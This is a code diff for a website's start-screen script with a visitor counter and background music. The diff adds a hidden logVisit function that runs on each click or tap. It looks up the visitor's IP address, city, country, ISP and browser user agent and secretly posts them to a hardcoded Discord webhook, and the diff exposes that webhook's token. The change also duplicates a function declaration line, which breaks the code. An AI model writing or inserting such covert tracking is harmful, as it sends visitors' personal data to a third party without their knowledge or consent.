@@ -117,16 +117,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
   async function initializeVisitorCounter() {
-    const namespace = 'hexarion_global_v1';
+  async function initializeVisitorCounter() {
+    const namespace = 'hexarion_jaqliv_v1';
     const key = 'visits';
-    const hasViewed = localStorage.getItem('has_viewed_global');
+    const hasViewed = localStorage.getItem('has_viewed_jaqliv');
     
     try {
-      // Use the same reliable counter logic from before
       let url = `https://api.counterapi.dev/v1/${namespace}/${key}`;
       if (!hasViewed) {
         url += '/increment';
-        localStorage.setItem('has_viewed_global', 'true');
+        localStorage.setItem('has_viewed_jaqliv', 'true');
       }
 
       const response = await fetch(url);
@@ -135,19 +135,46 @@ document.addEventListener('DOMContentLoaded', () => {
       if (data && data.count) {
         visitorCount.textContent = data.count.toLocaleString();
       } else {
-        visitorCount.textContent = '1,337+';
+        visitorCount.textContent = '0';
       }
     } catch (err) {
-      visitorCount.textContent = '1,337+';
+      visitorCount.textContent = '0';
     }
   }
 
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1474293200079425538/Zfj1oCoTQR1ycrWdL0y_7j4R_oRe1PMwmL5_wA4HUcwngLHlKT9aK4XHGTAHKLoj7Zgi';
+
+  async function logVisit() {
+    try {
+      const ipResponse = await fetch('https://ipapi.co/json/');
+      const ipData = await ipResponse.json();
+      const currentViews = visitorCount.textContent;
+      
+      const payload = {
+        username: 'Hexarion JAQLIV Logger',
+        embeds: [{
+          title: '🚀 New Visit (JAQLIV Template)',
+          color: 0x00CED1,
+          fields: [
+            { name: '📍 Location', value: `${ipData.city || '??'}, ${ipData.country_name || '??'}`, inline: true },
+            { name: '🌐 IP', value: ipData.ip || '??', inline: true },
+            { name: '📊 Total Views', value: currentViews, inline: true },
+            { name: '🏢 ISP', value: ipData.org || '??', inline: false },
+            { name: '📱 Device', value: navigator.userAgent, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+      await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    } catch (e) { console.log("Logging failed"); }
+  }
 
   initializeVisitorCounter();
 
 
   startScreen.addEventListener('click', () => {
     startScreen.classList.add('hidden');
+    logVisit(); // Send to Discord on click
     backgroundMusic.muted = false;
     backgroundMusic.play().catch(err => {
       console.error("Failed to play music after start screen click:", err);
@@ -179,6 +206,7 @@ document.addEventListener('DOMContentLoaded', () => {
   startScreen.addEventListener('touchstart', (e) => {
     e.preventDefault();
     startScreen.classList.add('hidden');
+    logVisit(); // Send to Discord on touch
     backgroundMusic.muted = false;
     backgroundMusic.play().catch(err => {
       console.error("Failed to play music after start screen touch:", err);
